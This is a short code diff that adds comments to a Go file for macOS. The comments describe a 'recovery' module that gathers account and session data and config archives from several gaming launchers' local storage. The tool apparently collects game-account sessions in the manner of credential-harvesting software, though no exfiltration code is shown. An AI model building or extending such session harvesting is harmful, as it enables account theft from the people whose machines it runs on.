@@ -1,5 +1,9 @@
 //go:build darwin
 
+// gaming_darwin.go — Steam / Battle.net / Epic / Riot / Uplay session paths on macOS.
+//
+// Collects lightweight account/session metadata (and optional small config zips)
+// from Application Support locations; does not crack launcher encryption.
 package recovery
 
 import (
@@ -16,6 +20,7 @@ func pathExists(path string) bool {
 	return err == nil
 }
 
+// ScanGaming returns nil-empty-safe gaming results for all supported launchers.
 func ScanGaming() *types.GamingResult {
 	result := &types.GamingResult{
 		Steam:     scanSteamDarwin(),
